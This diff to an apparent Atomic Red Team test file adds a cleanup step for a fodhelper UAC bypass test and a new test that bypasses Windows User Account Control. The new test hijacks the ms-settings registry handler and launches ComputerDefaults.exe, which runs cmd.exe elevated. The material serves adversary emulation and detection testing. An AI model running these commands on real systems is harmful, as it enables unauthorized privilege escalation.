@@ -84,3 +84,29 @@ atomic_tests:
       New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
       Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
       Start-Process "C:\Windows\System32\fodhelper.exe"
+    cleanup_command: |
+      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+
+- name: Bypass UAC using ComputerDefaults - PowerShell
+  description: |
+    PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+      New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+      Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+      Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+    cleanup_command: |
+      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
